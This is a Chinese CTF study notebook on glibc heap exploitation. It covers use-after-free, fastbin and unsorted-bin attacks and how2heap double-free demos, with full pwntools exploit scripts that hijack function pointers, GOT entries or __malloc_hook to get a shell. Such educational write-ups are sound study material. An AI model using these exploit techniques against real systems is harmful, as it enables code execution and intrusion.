（上一世被丢进回收站一个月后被一堆乱码取代，这一世从堆开始，立誓要重塑前世荣光）



# canary

add函数:

![image-20261026185050913](assets/image-20261026185050913.png)

Puts函数：

![image-20261026185123445](assets/image-20261026185123445.png)

![image-20261026185220930](assets/image-20261026185220930.png)

堆溢出，主要就是在这里修改topchunk











# 1.UAF

## 1.HackNote

![image-20260904172026686](assets/image-20260904172026686.png)

菜单然后就是，查看各自的功能，于是在delete中发现

![image-20260904172133477](assets/image-20260904172133477.png)

free后并没有进行指针清零，后面还有一个函数是print函数，于是这个时候在新建完两条笔记再次删除之后，

比如新建A B 之后删除 在bin里就会组成链表

B->A

这时如果再次新建笔记，就会从bin里面找出B之后，我们编辑的时候就可以修改里面的内容，就是相当于修改原来A里内容，改成后门函数之后，再次打印A这个时候就会触发后门函数。

模拟创建函数，模拟其中的函数实现流程

比如说就是创建add函数

![image-20260904173754763](assets/image-20260904173754763.png)

![image-20260904174505089](assets/image-20260904174505089.png)

选择fastbin的优点：

![image-20260904175323271](assets/image-20260904175323271.png)

而0x80再加上头部之后就会超过fastbin的大小范围，就会进入unsortedebin，于是

![image-20260904180045350](assets/image-20260904180045350.png)

所以只需要删除两个之后再次添加一个fastbin之后，就会指向A的fastbin这个时候再去修改函数就可以

str(size).encode();

输入的是0x80，这个时候str输出的是10进制之后.encode()把字符串转换成字节串

![image-20260904182233859](assets/image-20260904182233859.png)

```python
from pwn import *

# ========== 环境设置 ==========
context(arch='i386', os='linux', log_level='debug')

# ========== 连接方式 ==========
# 本地调试
io = process('./hacknote')
# 远程打靶（替换成实际IP和端口）
# io = remote('ip', port)

# ========== 后门函数地址（从IDA获取） ==========
magic_addr = 0x804896b

# ========== 辅助函数 ==========
def add(size, content):
    """新建笔记：选1 → 输入size → 输入content"""
    io.sendlineafter(b'choice :', b'1')
    io.sendlineafter(b'size :', str(size).encode())
    io.sendafter(b'Content :', content)

def delete(index):
    """删除笔记：选2 → 输入index"""
    io.sendlineafter(b'choice :', b'2')
    io.sendlineafter(b'Index :', str(index).encode())

def show(index):
    """查看笔记：选3 → 输入index"""
    io.sendlineafter(b'choice :', b'3')
    io.sendlineafter(b'Index :', str(index).encode())

# ========== Step 1: 新建两条笔记 ==========
# content大小选0x80，让content进unsortedbin，不干扰fastbin[0]
add(0x80, b'aaaa')      # 笔记0: 结构体A(8B) + content_a(0x80B)
add(0x80, b'bbbb')      # 笔记1: 结构体B(8B) + content_b(0x80B)

# ========== Step 2: 删除两条笔记（触发UAF） ==========
# free后 notelist[0]还指向A，notelist[1]还指向B（没清空！）
# fastbin[0]: 结构体B → 结构体A → NULL（LIFO后进先出）
delete(0)
delete(1)

# ========== Step 3: 新建笔记2，覆盖笔记0的函数指针 ==========
# add_note内部两次malloc(8):
#   第1次malloc(8) → 从fastbin[0]拿 → 结构体B → 当笔记2的结构体
#   第2次malloc(8) → 从fastbin[0]拿 → 结构体A → 当笔记2的内容区！
# 往笔记2的内容区写magic_addr = 往结构体A写magic_addr
# = 覆盖笔记0结构体偏移0的函数指针！
add(8, p32(magic_addr))

# ========== Step 4: 查看笔记0，触发后门 ==========
# print_note(0):
#   1. 读notelist[0] → 指向A（没清空，还能找到）
#   2. 读A偏移0 → magic_addr（被我们覆盖了）
#   3. 跳转到magic_addr执行
#   4. magic() → system("/bin/sh") → getshell！
show(0)

# ========== 交互模式 ==========
io.interactive()
```

## 2.**[ZJCTF 2019]EasyHeap**

![image-20260904182949488](assets/image-20260904182949488.png)

后门函数

![image-20260904183008799](assets/image-20260904183008799.png)

菜单题

![image-20260904183109295](assets/image-20260904183109295.png)

可是这里的delete函数在删完之后就将指针清零











































## pw2

首先改一下看一下

libc库是就是函数库，而ld文件是来进行连接看调用哪个版本的函数库。

![image-20260907184352112](assets/image-20260907184352112.png)

![image-20260907184630758](assets/image-20260907184630758.png)

![image-20260907184935247](assets/image-20260907184935247.png)

那么只需要给它配置一个2.23的就可以。

那么再来复习一下配置文件的步骤

查找对应版本，`list` 就是**纯文本清单文件**，保存所有可下载的 glibc 版本名字。

```shell
cat list
```

找到对应版本进行下载

![image-20260907185442800](assets/image-20260907185442800.png)

![image-20260907185747172](assets/image-20260907185747172.png)



![image-20260907190029022](assets/image-20260907190029022.png)

![image-20260907185858842](assets/image-20260907185858842.png)





```shell
patchelf --set-interpreter ./ld-2.23.so ./pwn
patchelf --add-needed ./libc-2.23.so ./pwn
```

接下来正式看题

![image-20260907192124497](assets/image-20260907192124497.png)

菜单题，

add:

![image-20260907192213432](assets/image-20260907192213432.png)



delete：

![image-20260907192243728](assets/image-20260907192243728.png)

可以看到这里将指针清零了。





编辑：

![image-20260907192332324](assets/image-20260907192332324.png)

堆溢出，嗯嗯原来这就是堆溢出

那么之后呢，不知道。哦，对了，还有一个shell函数

但是需要修改东西



![image-20260907192740155](assets/image-20260907192740155.png)

![image-20260907192650036](assets/image-20260907192650036.png)

首先就是创建一个堆块

之后再次创建一个堆块，使得释放之后进入fastbin之后

为什么必须是fastbin?

先回忆 fastbin 的核心行为（glibc‑2.23）：

1. fastbin 是**单向链表，只用 fd，没有 bk**。
2. free 进 fastbin 的时候**不做完整性检查**。
3. malloc 从 fastbin 取块的时候：**只校验 size 是否匹配 fastbin 下标，不校验这个 fd 指向的地址是不是真正堆内存**。

编辑chunk1之后堆溢出到chunk2的fd指针，使得这个指针停留在key指针附近，之后再次malloc的时候获取这个堆块就可以，编辑其附近的内容也就是key的内容，修改它的值，可以。

来呗，动调。

key的地址附近情况:

![image-20260907203638230](assets/image-20260907203638230.png)



# EASY HEAP



![image-20261012153624854](assets/image-20261012153624854.png)

首先还是菜单题

![image-20261012160409368](assets/image-20261012160409368.png)

依旧是

creat a heap

![image-20261012160658801](assets/image-20261012160658801.png)

在这里并没有什么

之后

![image-20261012163657355](assets/image-20261012163657355.png)

atoi函数就是将输入的字符串转化成整数

![image-20261012164241496](assets/image-20261012164241496.png)

所以说这里就是进行堆溢出

delete函数，指针清零，不存在uaf

![image-20261012164440010](assets/image-20261012164440010.png)

![image-20261012172805483](assets/image-20261012172805483.png)



![image-20261012154050929](assets/image-20261012154050929.png)

后门函数

#### fastbin attack

fastbin检查：

也就是从fastbin取堆块的时候会检查其size字段，计算这个除以16再-2，看是否和这个档位相符。然后再取

![image-20261012171519666](assets/image-20261012171519666.png)

如果申请0x60大小的堆块，之后分配0x70，之后修改size段为0x7f,之后就绕过检查

![image-20261012172306617](assets/image-20261012172306617.png)

所以再填满chunk1之后再填满prev_size之后就到达size字段，和fd

![image-20261012173932094](assets/image-20261012173932094.png)

edit函数把一开始写入的内容修改掉了

![image-20261012175410623](assets/image-20261012175410623.png)

一开始创建的三个·0x60大小的堆块，

然后其fd存储的都是一开始存储的内容

接下来释放chunk2

![image-20261012180147339](assets/image-20261012180147339.png)

此时chunk2已经进入fastbin链表，

之后修改chunk1，并且把字符串写入进去，修改chunk2的fd字段，和size字段

![image-20261012181038960](assets/image-20261012181038960.png)

可以看到此时fastbin链表中已经有了我们想要的数组附近的地址

接下来申请fastbin链表中的堆块，

![image-20261012182207587](assets/image-20261012182207587.png)

因为一开始把chunk2的fd指针改成0x6020ad ,之后malloc的时候就会返回+0x10的

![image-20261012182620381](assets/image-20261012182620381.png)

![image-20261012183956176](assets/image-20261012183956176.png)

所以说我们一开始申请的就是ad这里的值，之后因为+0x8之后正好是size字段，之后正好size字段是0x7f，满足从fastbin里面取堆块的条件，所以之后的content段就在bd，而接下来我们只需要填充chunk3,到达后面的指针数组，之后修改

![image-20261012184519123](assets/image-20261012184519123.png)

修改chunk0的堆地址为free的got,之后

![image-20261012184740043](assets/image-20261012184740043.png)

![image-20261012185147277](assets/image-20261012185147277.png)

修改完成

![image-20261012185250528](assets/image-20261012185250528.png)

这是里面的原始值，接下来修改为system函数地址

![image-20261012185958526](assets/image-20261012185958526.png)

修改哦完之后

![image-20261012190329535](assets/image-20261012190329535.png)

修改完成，之后只需要删除chunk0就可以，触发system

![image-20261012190608410](assets/image-20261012190608410.png)

这里传入的是system函数的got,需要plt

![image-20261012190819669](assets/image-20261012190819669.png)

```python
from pwn import *
context.log_level="debug"
io=process("./pwn")
#io=remote("node4.buuoj.cn",26646)
elf=ELF("./pwn")
#gdb.attach(io)
def add(size,content):
    io.recvuntil("choice :")
    io.sendline("1")
    io.recvuntil("Size of Heap : ")
    io.sendline(str(size))
    io.recvuntil("Content of heap:")
    io.send(content)


def edit(index,size,content):
    io.recvuntil("choice :")
    io.sendline("2")
    io.recvuntil("Index :")
    io.sendline(str(index))
    io.recvuntil("Size of Heap : ")
    io.sendline(str(size))
    io.recvuntil("Content of heap : ")
    io.send(content)

def delete(index):
    io.recvuntil("choice :")
    io.sendline("3")
    io.recvuntil("Index :")
    io.sendline(str(index))

add(0x60,"happy")
add(0x60,"happy")
add(0x60,"happy")

delete(2)

pay1=b'/bin/sh\x00'+b'a'*0x60+p64(0x71)+p64(0x6020ad)
edit(1,len(pay1),pay1)

add(0x60,"aaaa")
add(0x60,"bbbb")
pay2=b'a'*0x23+p64(elf.got["free"])
edit(3,len(pay2),pay2)
pay3=p64(elf.plt["system"])
edit(0,len(pay3),pay3)
delete(1)
io.interactive()

```

# **hitcontraining_magicheap**

找的一道unsoretdbin攻击的题目

![image-20261014143227998](assets/image-20261014143227998.png)

检查保护，虽然现在还不知道堆题检查保护有什么用

![image-20261014143534722](assets/image-20261014143534722.png)

主要函数

![image-20261014143553101](assets/image-20261014143553101.png)

后门函数，只需要将

![image-20261014143658412](assets/image-20261014143658412.png)

所以先依靠前面的漏洞点修改magic的值，之后再次4869就可以

![image-20261014143924409](assets/image-20261014143924409.png)

creat函数

![image-20261014143942454](assets/image-20261014143942454.png)

edit函数

![image-20261014144000882](assets/image-20261014144000882.png)

delete函数

只是看到没有uaf，指针被清零

倒是觉得edit函数存在堆溢出

倒是可以连续申请，释放一个，之后堆溢出修改bk指针，为magic-0x10

之后magic的值就会变成libc地址，总之应该比要求的要大。

![image-20261014144607430](assets/image-20261014144607430.png)

magic 地址

0x6020a0

![image-20261014145601904](assets/image-20261014145601904.png)

首先创建的两个chunk,其中一个满足fastbin，另一个满足unsortedbin

接下来删除第二个

![image-20261014145924741](assets/image-20261014145924741.png)

并没有找到

因为chunk1和top chunk合并

![image-20261014150149121](assets/image-20261014150149121.png)

加上第3个堆块之后，就有可以看到

此时的fd和bk已经指向了main_area

![image-20261014150307884](assets/image-20261014150307884.png)

接下来编辑chunk0来进行，修改unsortedbin中的bk指针为magic-0x10

![image-20261014150539475](assets/image-20261014150539475.png)

可以看到此时里面没有值

溢出过程：

第一次;

![image-20261014151243899](assets/image-20261014151243899.png)

bk指针已经修改为0x602090

接下来应该是再次申请一次，就可以修改magic的值了

![image-20261014151657438](assets/image-20261014151657438.png)

gdb开启失败，应该是伪造的相关问题

pay=b'a'*0x38+p64(magic-0x10)

这个只是将chunk0的数据区覆盖，之后跳过size,跳过fd，直接到达bk并修改，哪有那么容易，虽然确实修改了

![image-20261014152103534](assets/image-20261014152103534.png)

当时确实报错了

再次修改

pay=b'a'*0x20+p64(0)+p64(0x91)+p64(0)+p64(magic-0x10)

修改完之后的

![image-20261014152320746](assets/image-20261014152320746.png)

成功出现，并且bk指针也是预期的，这是申请完之后的，也就是脱链操作已经进行完之后的，此时可以看看magic的值是否修改完成。

![image-20261014152512895](assets/image-20261014152512895.png)

修改完成。

此时只需要发送那个啥就行了。

![image-20261014153350824](assets/image-20261014153350824.png)

成功了

exp：

```python
from pwn import*
r=process('./pwn')
magic=0x6020a0
#gdb.attach(r)
def create(size,content):
	r.recvuntil(':')
	r.sendline('1')
	r.recvuntil(':')
	r.sendline(str(size))
	r.recvuntil(':')
	r.sendline(content)

def edit(idx,size,content):
	r.recvuntil(':')
	r.sendline('2')
	r.recvuntil(':')
	r.sendline(str(idx))
	r.recvuntil(':')
	r.sendline(str(size))
	r.recvuntil(':')
	r.sendline(content)

def delete(idx):
	r.recvuntil(':')
	r.sendline('3')
	r.recvuntil(':')
	r.sendline(str(idx))

create(0x20,b'aaaa')
create(0x80,b'bbbb')
create(0x20,b'aaaa')

delete(1)

pay=b'a'*0x20+p64(0)+p64(0x91)+p64(0)+p64(magic-0x10)
edit(0,len(pay),pay)

create(0x80,b'bbbb')
r.sendlineafter(b':',b'4869')
r.interactive()
```

# bcloud_bctf_2016

检查

![image-20261014185404864](assets/image-20261014185404864.png)

md,不会

[bcloud_bctf_2016 - LynneHuan - 博客园](https://www.cnblogs.com/LynneHuan/p/14616450.html)

# **hitcontraining_uaf**



![image-20261014190626316](assets/image-20261014190626316.png)

32位程序

![image-20261014190721531](assets/image-20261014190721531.png)

依旧菜单题

虽然add函数看不懂，但是可以看到delete函数有uaf漏洞，但这是两个指针吗，反正free两次，但是都没有清零。

![image-20261014192344598](assets/image-20261014192344598.png)

创建一个新的笔记的时候都是会创建一个结构体即是8字节的，里面存的是printf_note的地址和内容地址，之后紧跟着的才是想要存入的内容，

所以现在就是想将printf_note的内容改成后门函数地址。

在fastbin中，释放掉的堆块是按照相对应的大小进行排列的，因为两个结构体的大小都是8字节，所以只需要申请两个大于8字节size大小的堆块，之后再次申请一个大小为8字节size的堆块

这一步就相当于直接就把一开始申请的两个结构体申请出来，这样就可以修改第二个结构体头部的prinf_not函数地址的内容，于是修改为我们后门函数地址。

![image-20261014201624641](assets/image-20261014201624641.png)



```python
from pwn import *

context(arch="i386",os="linux",log_level="debug")

p = process("./pwn")
elf = ELF("./pwn")
# p = remote("node5.buuoj.cn",27273)

def addnote(size = b'32',content = b'A'*32):
	p.sendlineafter(b'Your choice :',b'1')
	p.sendafter(b'Note size :',size)
	p.sendafter(b'Content :',content)

def delnote(index):
	p.sendlineafter(b'Your choice :',b'2')
	p.sendafter(b'Index :',index)

def printnote(index):
	p.sendlineafter(b'Your choice :',b'3')
	p.sendafter(b'Index :',index)

def m_exit():
	p.sendlineafter(b'Your choice :',b'4')
addnote()
addnote()

delnote(b'0')
delnote(b'1')

magic=0x8048945

p.sendlineafter(b'Your choice :',b'1')
p.sendafter(b'Note size :',b'8')
p.sendafter(b'Content :',p64(magic))

printnote(b'0')

p.interactive()

```

# **0ctf_2017_babyheap**



看ai说只是修改两个小堆块，修改其中一个的size之后释放，使得两个小堆块进入unsortedbin 之后再次申请小的，其中一个被取出，另一个仍在unsortedbin中，之后查看内容，其fd和bk即是原始的数据区，当然是另一个小堆块，即可泄露出libc的相关地址

![image-20261015182358632](assets/image-20261015182358632.png)

保护全开，或许堆题查看保护只是看它是多少位的

64位

ida查看关键函数

![image-20261015183255429](assets/image-20261015183255429.png)

添加函数，限制size大小

![image-20261015183416440](assets/image-20261015183416440.png)

编辑函数，这里可以自己定义内容大小，应该可以堆溢出



![image-20261015183508344](assets/image-20261015183508344.png)

释放函数，指针清零，没有uaf啥的

![image-20261015183549246](assets/image-20261015183549246.png)

退出函数

额，这么一想，好像查看保护也挺有用，这道题保护全开，嘶，也没有uaf。

不对，保护全开，基址是变化的，所以需要泄露libc基址

那么泄露完之后呢

![image-20261016154035435](assets/image-20261016154035435.png)

结构体呢？分配的堆块呢？

那么再编辑一下内容

![image-20261016154307970](assets/image-20261016154307970.png)

![image-20261016154400956](assets/image-20261016154400956.png)

这个倒是看起来挺正常的，就是挺干净的

![image-20261016154706416](assets/image-20261016154706416.png)

挺正常

感觉可以直接dump出来

![image-20261016154911013](assets/image-20261016154911013.png)

哦，原来没有相关的指针了，被清零了。

编辑函数中有堆溢出。怎么用？

哦哦，修改小堆块的size之后，让他们进入unsortedbin

![image-20261017094927733](assets/image-20261017094927733.png)

主要有5个堆块，第一个来进行溢出，使得第2个第3个进入fastbin之后，修改指针指向第5个堆块，之后

![image-20261017100847801](assets/image-20261017100847801.png)



![image-20261017101946239](assets/image-20261017101946239.png)

写入位置，修改位置，修改位置的值



![image-20261017102121675](assets/image-20261017102121675.png)

此时已经修改过来了，此时需要申请来再次指向这个chunk4,但是它处于的是0x20大小的列表中，所以还需要修改chunk4的大小。

这个时候需要借助chunk3进行堆溢出修改

![image-20261017102510540](assets/image-20261017102510540.png)

写入位置，修改的值

![image-20261017102748001](assets/image-20261017102748001.png)

修改完成

接下来申请。

![image-20261017102952669](assets/image-20261017102952669.png)

此时列表中什么都没有，所以就是原来的2序号就是指向了chunk4

但是4序号还是指向chunk4

这时泄露libc地址，需要chunk4进入unsoretdbin,之后需要将chunk4的size改回去

![image-20261017105427363](assets/image-20261017105427363.png)

释放

![image-20261017105709616](assets/image-20261017105709616.png)

接下来借助chun2来泄露

![image-20261017113215330](assets/image-20261017113215330.png)



![image-20261017113229609](assets/image-20261017113229609.png)

终于接收到了

接下来计算Libc基址

![image-20261017160122329](assets/image-20261017160122329.png)

直接就是泄露出来的再减去这个就是

![image-20261017161110837](assets/image-20261017161110837.png)

查看malloc_hook附近的函数，然后在进行伪造，使得能够修改其附近的地址。

接下来就是修改

![image-20261017162351962](assets/image-20261017162351962.png)

![image-20261017162507225](assets/image-20261017162507225.png)

所以weizaochunk的地址就是libc基址再加上0x3c4aed.

然后就是fastbin中修改chunk，之后的话再去更改其fd指针，之后再次申请就可以获得这个fake_chunk,之后再写入就可以。

因为是7a

所以申请的大小应该是0x60,

![image-20261017165018457](assets/image-20261017165018457.png)

真的在第四个，一开始还不知道为什么又删除的是第四个

![image-20261017165222038](assets/image-20261017165222038.png)

即是修改其fd指针

因为2号和4号都是

所以直接通过修改2号来进行fd修改

![image-20261017171305470](assets/image-20261017171305470.png)

liubc居然弄错了，0a20空格和换行

![image-20261017172724693](assets/image-20261017172724693.png)

![image-20261017172815607](assets/image-20261017172815607.png)

也是成功指过去了

在原来的堆块里面找了半天，地址就不在那里面还找，其实可以写入一些数据，看看是否能写入那个函数附近

![image-20261017175018550](assets/image-20261017175018550.png)

好呀，也是成功的把aaaa写进去了

那么接下来算到malloc_hook的偏移

0x7ff4678e3b10 malloc_hook函数地址

0x7ff4678e3afd  写入地址

相差0x13

![image-20261017180053556](assets/image-20261017180053556.png)

改完了，接下来只需要申请一下调用这个函数就可以

这个和wp中的不一样，用的本地的

![image-20261017181703060](assets/image-20261017181703060.png)

exp:

```python
from pwn import*
r=process('./pwn')
context.log_level='debug'
#gdb.attach(r)
def add(size):
	r.recvuntil(b':')
	r.sendline(b'1')
	r.recvuntil(b':')
	r.sendline(str(size))

def edit(idx,size,content):
	r.recvuntil(b':')
	r.sendline(b'2')
	r.recvuntil(b':')
	r.sendline(str(idx))
	r.recvuntil(b':')
	r.sendline(str(size))
	r.recvuntil(b':')
	r.sendline(content)

def delete(idx):
	r.recvuntil(b':')
	r.sendline(b'3')
	r.recvuntil(b':')
	r.sendline(str(idx))

def dump(idx):
    r.recvuntil(b':')
    r.sendline(b'4')
    r.recvuntil(b':')
    r.sendline(str(idx))

add(0x10)
add(0x10)
add(0x10)
add(0x10)
add(0x80)
add(0x10)

delete(1)
delete(2)

pay=p64(0)*3+p64(0x21)+p64(0)*3+p64(0x21)+p8(0x80)
edit(0,len(pay),pay)

pay1=p64(0)*3+p64(0x21)
edit(3,len(pay1),pay1)

add(0x10)
add(0x10)

pay2=p64(0)*3+p64(0x91)
edit(3,len(pay2),pay2)

delete(4)

dump(2)
r.recvuntil(b'Content: \n')
addr=(r.recv(6)).ljust(8,b'\x00')
print(u64(addr))
libase=u64(addr)-0x3c4b78
print(libase)
#pause()

fake_chunk=libase+0x3c4aed
add(0x60)
delete(4)
edit(2,len(p64(fake_chunk)),p64(fake_chunk))

add(0x60)
add(0x60)

pay3=b'a'*0x13+p64(libase+0x4527a)
#pay3=p8(0)*3+p64(0)*2+p64(libase+0x4526a)

edit(6,len(pay3),pay3)

add(0x50)

r.interactive()


```







![image-20261017181610483](assets/image-20261017181610483.png)

**gyctf_2020_force**

![image-20261025153237158](assets/image-20261025153237158.png)

![image-20261025153511815](assets/image-20261025153511815.png)

简单的增加一个堆块，但是size并没有限制，然后增加内容。并且展示新增加的堆块的地址

好吧其实是有限制的，只能读入50字节。











# **0ctf_2018_heapstorm2**

![image-20261020154507359](assets/image-20261020154507359.png)

依旧保护全开，那么肯定还是先泄露libc了。



# gyctf_2020_force

![image-20261026181446779](assets/image-20261026181446779.png)





















































# 单身杯

## 1.CheckIn

保护全开

![image-20261016231113941](assets/image-20261016231113941.png)

![image-20261016231136177](assets/image-20261016231136177.png)

主流程

然后发现一个函数

![image-20261016231229526](assets/image-20261016231229526.png)

这里似乎是触发，输入字符串

这个jmp跳转的地方好像是rax的值，那个read函数不是读取字符数量会存到rax中吗

# HOW2HEAP

## 2.23（部分）

## fastbin_dump

```c
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

int main()
{
	fprintf(stderr, "This file demonstrates a simple double-free attack with fastbins.\n");

	fprintf(stderr, "Allocating 3 buffers.\n");
	int *a = malloc(8);
	int *b = malloc(8);
	int *c = malloc(8);

	fprintf(stderr, "1st malloc(8): %p\n", a);
	fprintf(stderr, "2nd malloc(8): %p\n", b);
	fprintf(stderr, "3rd malloc(8): %p\n", c);

	fprintf(stderr, "Freeing the first one...\n");
	free(a);

	fprintf(stderr, "If we free %p again, things will crash because %p is at the top of the free list.\n", a, a);
	// free(a);

	fprintf(stderr, "So, instead, we'll free %p.\n", b);
	free(b);

	fprintf(stderr, "Now, we can free %p again, since it's not the head of the free list.\n", a);
	free(a);

	fprintf(stderr, "Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we'll get %p twice!\n", a, b, a, a);
	a = malloc(8);
	b = malloc(8);
	c = malloc(8);
	fprintf(stderr, "1st malloc(8): %p\n", a);
	fprintf(stderr, "2nd malloc(8): %p\n", b);
	fprintf(stderr, "3rd malloc(8): %p\n", c);

	assert(a == c);
}
```

其实就只是double基于fastbin机制下的

gdb调一下

```bash
gcc -g -O0 -o double_free fastbin_dup.c
```

![image-20261027183522092](assets/image-20261027183522092.png)

申请一个堆块之后是这样的接下来申请完

![image-20261027183627665](assets/image-20261027183627665.png)

删除a

![image-20261027183748075](assets/image-20261027183748075.png)

删除b

![image-20261027183851996](assets/image-20261027183851996.png)

再次删除a

![image-20261027183934946](assets/image-20261027183934946.png)

a被释放两次，a此时又变成了头部

此时也是变成了环，这就形成了double free

接下来申请

![image-20261027184708700](assets/image-20261027184708700.png)

确实，申请两次之后，确实里面确实还是原本b指向的a堆块的地址

![image-20261027184957833](assets/image-20261027184957833.png)

![image-20261027185638062](assets/image-20261027185638062.png)

可以看到a和c所指向的地址一样

这就是double达到的效果

Fastbin Double Free 是通过打破 `fasttop` 检查，在 Fastbin 单链表中制造**环**，从而实现**同一块内存被多次分配（UAF）**，最终达到劫持 `fd` 指针、实现**任意地址分配（Arbitrary Alloc）**的目的。

## fastbin_dup_consolidate

```bash
gcc -g -O0 -o 1 1.c
```

源码

```c
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

/*
Original reference: https://valsamaras.medium.com/the-toddlers-introduction-to-heap-exploitation-fastbin-dup-consolidate-part-4-2-ce6d68136aa8

This document is mostly used to demonstrate malloc_consolidate and how it can be leveraged with a
double free to gain two pointers to the same large-sized chunk, which is usually difficult to do 
directly due to the previnuse check.

malloc_consolidate(https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L4714) essentially
merges all fastbin chunks with their neighbors, puts them in the unsorted bin and merges them with top
if possible.

As of glibc version 2.35 it is called only in the following five places:
1. _int_malloc: A large sized chunk is being allocated (https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L3965)
2. _int_malloc: No bins were found for a chunk and top is too small (https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L4394)
3. _int_free: If the chunk size is >= FASTBIN_CONSOLIDATION_THRESHOLD (65536) (https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L4674)
4. mtrim: Always (https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L5041)
5. __libc_mallopt: Always (https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L5463)

We will be targeting the first place, so we will need to allocate a chunk that does not belong in the 
small bin (since we are trying to get into the 'else' branch of this check: https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L3901). 
This means our chunk will need to be of size >= 0x400 (it is thus large-sized).

*/

int main() {
	printf("This technique will make use of malloc_consolidate and a double free to gain a UAF / duplication of a large-sized chunk\n");

	void* p1 = calloc(1,0x40);

	printf("Allocate a fastbin chunk p1=%p \n", p1);
  	printf("Freeing p1 will add it to the fastbin.\n\n");
  	free(p1);

  	void* p3 = malloc(0x400);

	printf("To trigger malloc_consolidate we need to allocate a chunk with large chunk size (>= 0x400)\n");
	printf("which corresponds to request size >= 0x3f0. We will request 0x400 bytes, which will gives us\n");
	printf("a chunk with chunk size 0x410. p3=%p\n", p3);

	printf("\nmalloc_consolidate will merge the fast chunk p1 with top.\n");
	printf("p3 is allocated from top since there is no bin bigger than it. Thus, p1 = p3.\n");

	assert(p1 == p3);

  	printf("We will double free p1, which now points to the 0x410 chunk we just allocated (p3).\n\n");
	free(p1); // vulnerability

	printf("So p1 is double freed, and p3 hasn't been freed although it now points to the top, as our\n");
	printf("chunk got consolidated with it. We have thus achieved UAF!\n");

	printf("We will request a chunk of size 0x400, this will give us a 0x410 chunk from the top\n");
	printf("p3 and p1 will still be pointing to it.\n");
	void *p4 = malloc(0x400);

	assert(p4 == p3);

	printf("We now have two pointers (p3 and p4) that haven't been directly freed\n");
	printf("and both point to the same large-sized chunk. p3=%p p4=%p\n", p3, p4);
	printf("We have achieved duplication!\n\n");
	return 0;
}
```

看介绍似乎也是实现一个双指的作用，先申请一个小的之后释放掉，之后再申请一个大的，触发相关机制，fastbin中的与topchunk合并，使得再次分配的时候就会使得大堆块的内存地址与一开始申请的小的相同。

然后free小的指针，然后大的chunk就会被释放，之后再次申请大chunk，这次申请的地址就会和上一次申请的大chunk地址相同。从而实现双指。

有什么用？

![image-20261027194200212](assets/image-20261027194200212.png)



调试：

申请小堆0x40

![image-20261027194637072](assets/image-20261027194637072.png)

接下来先释放这个堆块进入fastbin

![image-20261027194826915](assets/image-20261027194826915.png)

接下来申请大堆块

![image-20261027194916118](assets/image-20261027194916118.png)

可以看到和一开始申请的小堆块地址一样

![image-20261027195013744](assets/image-20261027195013744.png)

接下来再释放p1

![image-20261027195129358](assets/image-20261027195129358.png)

释放完之后居然哪个bin也没有进入吗？

![image-20261027195623280](assets/image-20261027195623280.png)

行。然后再次申请大堆块，好像不管申请什么，都会获得一开始的地址

![image-20261027195807843](assets/image-20261027195807843.png)

![image-20261027195921605](assets/image-20261027195921605.png)

三个指针都指向开头

这个还是大的堆块，释放后还是会与topchunk合并。

行吧，起码知道还能这样。

## fastbin_dup_into_stack

这是写入栈中吗？（似乎是先将返回地址写入fd，之后直接篡改返回地址指向后门函数什么的）

```c
#include <stdio.h>
#include <stdlib.h>

int main()
{
	fprintf(stderr, "This file extends on fastbin_dup.c by tricking malloc into\n"
	       "returning a pointer to a controlled location (in this case, the stack).\n");

	unsigned long long stack_var;

	fprintf(stderr, "The address we want malloc() to return is %p.\n", 8+(char *)&stack_var);

	fprintf(stderr, "Allocating 3 buffers.\n");
	int *a = malloc(8);
	int *b = malloc(8);
	int *c = malloc(8);

	fprintf(stderr, "1st malloc(8): %p\n", a);
	fprintf(stderr, "2nd malloc(8): %p\n", b);
	fprintf(stderr, "3rd malloc(8): %p\n", c);

	fprintf(stderr, "Freeing the first one...\n");
	free(a);

	fprintf(stderr, "If we free %p again, things will crash because %p is at the top of the free list.\n", a, a);
	// free(a);

	fprintf(stderr, "So, instead, we'll free %p.\n", b);
	free(b);

	fprintf(stderr, "Now, we can free %p again, since it's not the head of the free list.\n", a);
	free(a);

	fprintf(stderr, "Now the free list has [ %p, %p, %p ]. "
		"We'll now carry out our attack by modifying data at %p.\n", a, b, a, a);
	unsigned long long *d = malloc(8);

	fprintf(stderr, "1st malloc(8): %p\n", d);
	fprintf(stderr, "2nd malloc(8): %p\n", malloc(8));
	fprintf(stderr, "Now the free list has [ %p ].\n", a);
	fprintf(stderr, "Now, we have access to %p while it remains at the head of the free list.\n"
		"so now we are writing a fake free size (in this case, 0x20) to the stack,\n"
		"so that malloc will think there is a free chunk there and agree to\n"
		"return a pointer to it.\n", a);
	stack_var = 0x20;

	fprintf(stderr, "Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n", a);
	*d = (unsigned long long) (((char*)&stack_var) - sizeof(d));

	fprintf(stderr, "3rd malloc(8): %p, putting the stack address on the free list\n", malloc(8));
	fprintf(stderr, "4th malloc(8): %p\n", malloc(8));
}
```

服了，一直给我讲伪造堆块的size字段，讲为什么-8啥的，真服了。直接调

首先就是构造double free

![image-20261027204750354](assets/image-20261027204750354.png)

首先申请3个在0x20大小范围的堆块

释放a

![image-20261027204931085](assets/image-20261027204931085.png)

之后free b之后再次free a造成double free

![image-20261027205028965](assets/image-20261027205028965.png)

接下来d申请一个小堆块，使得和a指向同一个堆块

![image-20261027205148806](assets/image-20261027205148806.png)

![image-20261027205243894](assets/image-20261027205243894.png)

接下来修改d就相当于修改a的相关结构内容了

![image-20261027205523134](assets/image-20261027205523134.png)

还可以看到此时的fastbin链表头是chunkb

而它之后有申请了一次，使得a变成链表头

![image-20261027205718737](assets/image-20261027205718737.png)

![image-20261027205743194](assets/image-20261027205743194.png)

确实如此

然后他之后就开始吓唬搞了

![image-20261027205844207](assets/image-20261027205844207.png)

![image-20261027210026081](assets/image-20261027210026081.png)

fastbin取出的时候会检查fd指向的堆块的size字段。而现在d指向的就是a的fd字段，我们想修改这里，使得验证通过。

因为是0x20 而那个地址存的值就是0x20，而一般size字段是在chunk头的+0x8字节，所以是size-0x8+0x8得到的就是0x20.

